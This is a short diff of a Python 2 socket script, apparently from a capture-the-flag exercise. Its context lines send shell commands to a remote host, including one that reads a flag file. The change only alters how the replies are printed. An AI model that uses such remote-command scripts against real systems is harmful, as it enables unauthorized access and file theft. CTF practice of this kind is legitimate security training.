@@ -30,7 +30,9 @@ while x<3:
                         #s.send('ls\n')
                         s.send('cat /home/magictype/flag3\n')
                         print s.recv(1024)
-                print s.recv(1024)+s.recv(1024)+s.recv(1024)
+                data = s.recv(1024)
+                print data
+                print s.recv(1024)+s.recv(1024)
         except:
                 s.close()
         x+=1
